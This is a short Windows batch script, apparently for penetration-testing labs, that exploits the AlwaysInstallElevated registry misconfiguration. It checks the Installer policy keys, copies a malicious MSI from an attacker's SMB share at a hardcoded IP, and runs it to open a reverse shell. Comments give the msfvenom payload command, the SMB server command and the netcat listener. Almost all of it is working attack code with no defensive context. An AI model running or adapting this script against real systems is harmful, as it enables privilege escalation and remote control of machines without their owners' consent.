:AlwaysInstallElevated exploit

set kali_ip=192.168.1.186

:Enumerate registry for vulnerable state. Should return 1 for both
echo on
@echo *********** >> C:\users\public\Exploit.log 
@echo %date% %time% Exploit AlwaysElevate registry weakness started. >> C:\users\public\Exploit.log 
@echo %date% %time% Enumerating registry >> C:\users\public\Exploit.log 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
ECHO.

: Copying over malicious MSI file
: REMEMBER to generate reverse shell and start samba share on Kali first:
 
: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=777 -f msi -o /tmp/reverse.msi
: sudo python /usr/local/bin/smbserver.py tmp /tmp/
: once copied open a reverse shell listener: nc -nvlp 777

@echo %date% %time% Copying malicious msi file >> C:\users\public\Exploit.log 

copy \\%kali_ip%\tmp\reverse.exe c:\Users\Public\reverse.msi

@echo %date% %time% Running malicious .msi file for reverse shell creation >> C:\users\public\Exploit.log 

c:\Users\Public\reverse.msi
@echo *********** >> C:\users\public\Exploit.log 
